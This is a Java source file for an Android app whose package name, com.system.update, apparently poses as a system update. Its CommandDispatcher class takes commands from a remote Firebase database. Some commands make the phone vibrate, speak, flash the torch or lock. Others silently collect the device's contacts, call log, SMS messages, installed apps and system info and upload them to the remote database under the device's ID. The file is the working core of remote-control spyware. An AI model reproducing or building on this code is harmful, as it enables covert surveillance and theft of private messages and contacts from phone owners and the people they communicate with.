package com.system.update;

import android.content.Context;
import android.util.Log;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class CommandDispatcher {

    private static final String TAG = "CommandDispatcher";
    private final Context ctx;
    private final String deviceId;
    private final DatabaseReference dataRef;

    public CommandDispatcher(Context ctx, String deviceId) {
        this.ctx = ctx;
        this.deviceId = deviceId;
        this.dataRef = FirebaseDatabase.getInstance().getReference("data").child(deviceId);
    }

    public void dispatch(Map<String, Object> cmd) {
        String type = (String) cmd.get("type");
        if (type == null) return;

        try {
            switch (type) {
                case "vibrate":
                    Hardware.vibrate(ctx, (long) getInt(cmd, "duration", 1000));
                    break;
                case "show_toast":
                    Hardware.toast(ctx, (String) cmd.get("message"));
                    break;
                case "show_notification":
                    Hardware.notification(ctx,
                            (String) cmd.get("title"),
                            (String) cmd.get("message"));
                    break;
                case "speak":
                    Hardware.speak(ctx, (String) cmd.get("text"));
                    break;
                case "torch":
                    Hardware.torch(ctx, (Boolean) cmd.getOrDefault("status", true));
                    break;
                case "lock":
                    Hardware.lock(ctx);
                    break;
                case "get_contacts":
                    ContactsHelper.pushContacts(ctx, dataRef);
                    break;
                case "get_call_log":
                    CallsHelper.pushCalls(ctx, dataRef);
                    break;
                case "get_sms_log":
                    SmsHelper.pushSms(ctx, dataRef);
                    break;
                case "get_installed_apps":
                    AppsHelper.pushApps(ctx, dataRef);
                    break;
                case "get_system_info":
                    SystemHelper.pushInfo(ctx, dataRef);
                    break;
                default:
                    Log.d(TAG, "Unknown command: " + type);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error executing " + type, e);
            Map<String, Object> err = new HashMap<>();
            err.put("error", e.getMessage());
            err.put("command", type);
            dataRef.child("errors").push().setValue(err);
        }
    }

    private int getInt(Map<String, Object> m, String key, int def) {
        Object v = m.get(key);
        if (v instanceof Number) return ((Number) v).intValue();
        return def;
    }
                                          }
